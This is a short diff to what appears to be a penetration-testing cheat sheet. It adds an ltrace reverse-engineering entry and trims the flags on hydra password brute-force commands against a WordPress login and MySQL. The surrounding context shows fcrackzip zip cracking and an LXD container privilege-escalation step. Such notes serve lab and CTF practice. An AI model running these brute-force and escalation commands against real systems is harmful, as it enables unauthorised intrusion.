@@ -49,6 +49,7 @@
 * [Custom Wordlists](#Custom-Wordlists)
 * [Crontab](#Crontab)
 * [LXD Privilege Escalation](#LXD-Privilege-Escalation)
+* [Reverse Engineering](#Reverse-Engineering)
 
 ## Windows
 * [Windows Password](#Windows-Password)
@@ -571,7 +572,7 @@ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' {ZIP_FILE}
 
 ### WordPress Login
 ```
-hydra -l {USER} -P /usr/share/wordlists/rockyou.txt -vV -f -t 4 {TARGET} http-post-form "/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error"
+hydra -l {USER} -P /usr/share/wordlists/rockyou.txt -f {TARGET} http-post-form "/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error"
 ```
 
 ```
@@ -585,7 +586,7 @@ hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f pop3
 
 ### MySQL
 ```
-hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f -t 32 mysql
+hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f mysql
 ```
 
 ### PGP File
@@ -843,6 +844,13 @@ lxc exec ignite /bin/sh
 
 # Enter in mounted directory
 cd /mnt/root/
+```
+
+# Reverse Engineering
+
+### ltrace
+```
+ltrace {BINARY}
 ```
 
 
